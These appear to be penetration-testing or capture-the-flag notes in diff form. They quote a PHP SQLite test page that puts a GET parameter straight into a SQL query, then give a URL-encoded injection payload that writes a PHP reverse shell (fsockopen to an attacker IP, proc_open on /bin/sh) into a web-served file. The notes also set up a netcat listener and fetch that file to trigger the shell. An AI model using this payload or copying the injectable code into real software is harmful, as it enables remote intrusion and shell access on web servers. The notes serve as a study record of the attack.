@@ -1,0 +1,56 @@
+#from sqlite test page
+Sqlite_test_page.php
+<html>
+<head></head>
+<body>
+<?php
+$no_results = $_GET['no_results'];
+$bookid = $_GET['bookid'];
+$query = "SELECT * FROM books WHERE id=".$bookid;
+if (isset($bookid)) {
+   class MyDB extends SQLite3
+   {
+      function __construct()
+      {
+	 // This folder is world writable - to be able to create/modify databases from PHP code
+         $this->open('d9e28afcf0b274a5e0542abb67db0784/books.db');
+      }
+   }
+   $db = new MyDB();
+   if(!$db){
+      echo $db->lastErrorMsg();
+   } else {
+      echo "Opened database successfully\n";
+   }
+   echo "Query : ".$query."\n";
+
+if (isset($no_results)) {
+   $ret = $db->exec($query);
+   if($ret==FALSE)
+    {
+	echo "Error : ".$db->lastErrorMsg();
+    }
+}
+else
+{
+   $ret = $db->query($query);
+   while($row = $ret->fetchArray(SQLITE3_ASSOC) ){
+      echo "Name = ". $row['name'] . "\n";
+   }
+   if($ret==FALSE)
+    {
+	echo "Error : ".$db->lastErrorMsg();
+    }
+   $db->close();
+}
+}
+?>
+</body>
+</html>
+
+run our payload to inject this - turns out proc_open was not added to the disabled php functions from phpinfo()
+
+python3 rc4-web-step.py <phpsessionid> "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1;attach%20database%20'd9e28afcf0b274a5e0542abb67db0784/test50.php'%20as%20pig;create%20table%20pig.own4%20(dataz%20TEXT);insert%20into%20pig.own4%20(dataz)%20values%20(%22<%3fphp%20;%20echo%20phpversion();echo%20'<pre>';%24sock%3dfsockopen('<ip>',80);%24proc%3dproc_open('/bin/sh%20-i',array(0%3d>%24sock,1%3d>%24sock,2%3d>%24sock),%24pipes);echo%20'<%2fpre>';%3f>%22);"
+
+setup nc listener
+python3 rc4-web-step.py <phpsessionid> "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test50.php
